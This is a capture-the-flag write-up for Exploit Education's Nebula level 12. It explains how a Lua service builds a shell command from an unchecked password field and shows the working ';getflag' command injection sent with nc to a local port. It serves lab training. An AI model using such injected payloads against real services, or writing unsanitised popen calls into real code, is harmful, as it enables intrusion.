### [Exploit Education Level 12](https://exploit.education/nebula/level-12/)

## Challenge
There is a backdoor process listening on port `50001`.

To do this level, log in as the `level12` account with the password `level12`. Files for this level can be found in `/home/flag12`.
The program is written is `lua`. 
After analysis the program I understood that it does the following.

1. receives input from the user
2. calls a function `hash` with the user input as the argument
3. the function `hash` executes the following command `echo "..password.." | sha1sum`
4. return the `sha1` hash of the input

My first attempt was to crack the hash somehow. I tried few `rainbow tables`. But it didn't work. 
## Vulnerability
The program is vulnerable to `command injection`
```lua
prog = io.popen("echo "..password.." | sha1sum", "r")
```
We can simply add our own commands by adding a `;` to `password` because the program doesn't do any
checks on the user input.
## Solution
Lets just run `getflag` and pipe the output to a file
```bash
level12@nebula:/tmp$ nc 127.0.0.1 50001
Password: ;getflag >> /tmp/flag_out;#
Better luck next time
level12@nebula:/tmp$ cat /tmp/flag_out
You have successfully executed getflag on a target account
```
### Solved!
